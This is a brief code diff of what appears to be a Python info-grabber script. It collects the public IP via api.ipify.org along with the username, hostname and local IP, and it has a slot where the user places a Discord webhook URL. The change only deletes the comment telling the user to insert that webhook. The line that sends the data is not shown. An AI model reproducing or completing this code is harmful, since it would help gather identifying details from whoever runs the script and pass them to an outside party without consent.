@@ -9,7 +9,7 @@ ipAdd = requests.get('https://api.ipify.org').text
 def get_username_os():
    return os.getenv("USERNAME")
 # Replace 'YOUR_WEBHOOK_URL' with your Discord webhook URL
-webhook_url = " "  #!!!!!PUT YOUR WEBHOOK HERE!!!!!
+webhook_url = " "
 hostname = socket.gethostname()
 ip_address = socket.gethostbyname(hostname)
 username = get_username_os()
